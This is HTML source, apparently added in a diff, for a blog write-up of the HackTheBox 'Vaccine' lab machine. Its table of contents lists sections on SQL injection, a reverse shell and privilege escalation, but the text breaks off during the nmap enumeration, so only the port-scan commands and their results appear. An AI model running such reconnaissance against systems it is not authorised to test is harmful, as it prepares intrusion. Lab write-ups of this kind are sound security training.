@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Vaccine Writeup - SHAFIQAIMAN</title><meta name="Description" content="HacktheBox - Vaccine Writeup"><meta property="og:title" content="HackTheBox - Vaccine Writeup" />
+<meta property="og:description" content="HacktheBox - Vaccine Writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/htb/vaccine/" /><meta property="og:image" content="http://localhost:1313/posts/htb/vaccine/featured.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-07-21T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/posts/htb/vaccine/featured.png" /><meta name="twitter:title" content="HackTheBox - Vaccine Writeup"/>
+<meta name="twitter:description" content="HacktheBox - Vaccine Writeup"/>
+<meta name="twitter:site" content="@_shafiqaiman_"/>
+<meta name="application-name" content="SHAFIQAIMAN">
+<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/htb/vaccine/" /><link rel="prev" href="http://localhost:1313/posts/htb/archetype/" /><link rel="next" href="http://localhost:1313/posts/htb/shield/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Vaccine Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/htb\/vaccine\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/posts\/htb\/vaccine\/featured.png",
+                            "width":  1058 ,
+                            "height":  661 
+                        }],"genre": "posts","keywords": "sqlmap, sql-union, sqli, GTFOBins, ftp, rce, zip2john, john, crackstation, python, PostgreSQL","wordcount":  1067 ,
+        "url": "http:\/\/localhost:1313\/posts\/htb\/vaccine\/","datePublished": "2021-07-21T00:00:00+00:00","dateModified": "2021-07-21T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "SH∆FIQ ∆IM∆N"
+            },"description": "HacktheBox - Vaccine Writeup"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Vaccine Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SH∆FIQ ∆IM∆N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HacktheBox</a>&nbsp;<a href="/categories/windows/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="21-07-2021">21-07-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1067 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/vaccine/featured.png"
+        data-srcset="/posts/htb/vaccine/featured.png, /posts/htb/vaccine/featured.png 1.5x, /posts/htb/vaccine/featured.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/vaccine/featured.png"
+        title="HacktheBox - Vaccine Writeup" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#ftp">FTP</a></li>
+    <li><a href="#zip2john">Zip2John</a>
+      <ul>
+        <li><a href="#john-the-ripperjtr">John-The-Ripper[JtR]</a></li>
+        <li><a href="#content-of-the-zipfile">Content of the ZipFile</a></li>
+      </ul>
+    </li>
+    <li><a href="#the-website">The Website</a>
+      <ul>
+        <li><a href="#sqlmap">SQLmap</a></li>
+        <li><a href="#union-select">UNION select</a></li>
+        <li><a href="#finding-columns-for-attack">Finding Columns for attack</a></li>
+        <li><a href="#python-script">Python script</a></li>
+        <li><a href="#finding-columns-with-useful-data">Finding Columns with useful data</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a>
+      <ul>
+        <li><a href="#the-version-of-database">The Version of database</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploit">Exploit</a></li>
+    <li><a href="#reverse-shell">Reverse Shell</a></li>
+    <li><a href="#ssh">SSH</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#root">Root</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Box author | <span class="h-card person-mention"><a href="https://app.hackthebox.com/users/8308" class="u-url url"><img class="u-photo photo" src="https://www.hackthebox.com/storage/avatars/bf7f262620421f0e5b49a8a69d583eee.png" alt="MinatoTW">&#8201;<span class="p-name fn">MinatoTW</span></a></span></p>
+<h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>Top 1000 ports scan</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -oN nmap/initial 10.10.10.46
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>the result</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Jun</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="mi">20</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">49</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">initial</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">2</span><span class="p">.</span><span class="mi">2</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">997</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">21</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">     </span><span class="n">vsftpd</span><span class="w"> </span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">6</span><span class="n">build1</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">3072</span><span class="w"> </span><span class="n">c0</span><span class="p">:</span><span class="n">ee</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">b0</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">91</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">a4</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="n">ac</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">51</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">42</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="p">:</span><span class="n">c3</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="n">df</span><span class="p">:</span><span class="n">ef</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">1</span><span class="n">d</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="n">d0</span><span class="p">:</span><span class="mi">28</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">cookie</span><span class="o">-</span><span class="n">flags</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="o">/</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">PHPSESSID</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">      </span><span class="n">httponly</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">set</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">MegaCorp</span><span class="w"> </span><span class="n">Login</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">OSs</span><span class="p">:</span><span class="w"> </span><span class="n">Unix</span><span class="p">,</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Jun</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="mi">20</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">09</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 199.30 seconds
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>All ports scan</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.46
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>the result</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Sun</span><span class="w"> </span><span class="n">Jun</span><span class="w">  </span><span class="mi">6</span><span class="w"> </span><span class="mi">01</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">52</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">all_ports</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">46</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">28</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65532</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">21</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ftp</span><span class="w">     </span><span class="n">vsftpd</span><span class="w"> </span><span class="mi">3</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">6</span><span class="n">build1</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">3072</span><span class="w"> </span><span class="n">c0</span><span class="p">:</span><span class="n">ee</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">b0</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">91</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">a4</span><span class="w"> </span><span class="p">(</span><span class="n">RSA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="n">ac</span><span class="p">:</span><span class="mi">6</span><span class="n">e</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="n">d7</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="n">b2</span><span class="p">:</span><span class="mi">51</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">42</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="p">:</span><span class="n">c3</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="n">df</span><span class="p">:</span><span class="n">ef</span><span class="p">:</span><span class="n">a2</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="n">c9</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">1</span><span class="n">d</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="n">d0</span><span class="p">:</span><span class="mi">28</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span><span class="w"> </span><span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">cookie</span><span class="o">-</span><span class="n">flags</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="o">/</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">PHPSESSID</span><span class="p">:</span><span class="w"> 
